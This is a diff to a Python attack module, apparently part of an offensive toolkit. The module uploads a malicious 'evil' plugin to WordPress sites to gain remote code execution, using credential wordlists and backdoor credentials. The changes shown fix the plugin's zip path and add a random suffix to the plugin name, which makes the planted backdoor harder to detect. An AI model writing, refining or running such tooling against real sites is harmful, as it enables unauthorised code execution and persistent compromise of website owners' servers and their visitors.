@@ -1,7 +1,7 @@
 '''
 name : WordPress Evil Plugin Upload Attack Module
 description : This module attempts to upload a malicious plugin to a WordPress site to gain remote code execution.
-version : 1.0
+version : 1.1
 author : Ayato
 '''
 
@@ -39,7 +39,7 @@ function secrets() {
 def create_plugin(workdir, folder, file):
     print("[*] Creating evil WordPress plugin...")
     try:
-        zip_path = f"{workdir}/{file}.zip"
+        zip_path = f"{workdir}/{folder}.zip"
         php_path = f"{workdir}/{folder}/{file}.php"
         work_folder = f"{workdir}/{folder}"
         os.system(f"rm -rf {work_folder}")
@@ -225,7 +225,8 @@ def run(ip, uri, user_agent, backdoor_credentials, workdir):
     if not wordlist_data:
         print("[-] No credentials data found. Exiting.")
         return -1
-    plugin_path = create_plugin(workdir, "secret_wp_plugin", "secret_wp_plugin")
+    random_suffix = os.urandom(4).hex()
+    plugin_path = create_plugin(workdir, f"secret_wp_plugin_{random_suffix}", f"secret_wp_plugin_{random_suffix}")
     if not plugin_path:
         print("[-] Failed to create evil plugin. Exiting.")
         return -1
